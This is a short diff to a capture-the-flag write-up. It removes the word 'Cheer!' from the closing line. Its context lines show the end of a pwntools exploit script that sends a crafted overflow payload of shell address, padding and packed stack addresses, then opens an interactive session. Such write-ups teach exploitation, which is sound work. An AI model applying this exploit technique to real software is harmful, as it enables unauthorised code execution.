@@ -436,4 +436,4 @@ r.sendline(shell_address + "A"*12 + p32(int(stack_address, 16) + 12) + p32(int(h
 r.interactive()
 ```
 
-**Cheer! Go through other [writeups](../) for more such fun challenges.**
+**Go through other [writeups](../) for more such fun challenges.**
